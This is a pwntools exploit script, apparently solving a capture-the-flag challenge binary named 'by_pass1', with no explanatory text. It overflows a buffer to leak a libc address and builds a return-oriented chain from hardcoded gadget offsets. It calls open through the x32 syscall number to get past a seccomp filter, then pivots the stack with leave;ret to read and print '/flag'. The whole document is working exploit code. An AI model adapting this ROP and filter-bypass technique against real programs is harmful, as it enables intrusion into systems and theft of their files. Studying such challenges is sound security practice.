from pwn import *
context.log_level = 'debug'
elf = ELF('./by_pass1')
libc = elf.libc
sh = process('./by_pass1')
leave_ret = 0x0000000000054913
pop_rdi = 0x00000000000215bf
pop_rdx_rsi = 0x0000000000130569 
pop_rax = 0x0000000000043ae8
syscall_ret = 0x00000000000D2745
sh.recvuntil('input you name')
sh.sendline('a')
sh.recvuntil('input you content')
gdb.attach(sh)
sh.send('a' * 0x108 + '\xa5')
sh.recvuntil('a' * 0x108)
libc_base = u64(sh.recvn(6).ljust(8, '\x00')) - 0x0000000000021Ba5
print(hex(libc_base))
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
pop_rdi = libc_base + pop_rdi
pop_rdx_rsi = libc_base + pop_rdx_rsi
pop_rax = libc_base + pop_rax
syscall_ret = libc_base + syscall_ret
leave_ret = libc_base + leave_ret

payload = p64(pop_rdi) + p64(0) + p64(pop_rdx_rsi) + p64(0x100) + p64(0x00000000006010C0) + p64(read_addr)
payload += p64(pop_rdi) + p64(0x00000000006010C0) + p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(pop_rax) + p64(0x40000000 + 2) + p64(syscall_ret)
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx_rsi) + p64(0x100) + p64(0x6010c0)+ p64(read_addr)
payload += p64(pop_rdi) + p64(1) + p64(pop_rdx_rsi) + p64(0x100) + p64(0x6010c0)+p64(write_addr)
sh.recvuntil('input you name')
sh.sendline(payload)
sh.recvuntil('input you content')
payload = 'a' * 0x100 + p64(0x00000000006010C0 -8) + p64(leave_ret)[:5]
#pause()
sh.send(payload)
#pause()
sh.sendline('/flag\x00')
print(hex(libc_base))
sh.interactive()
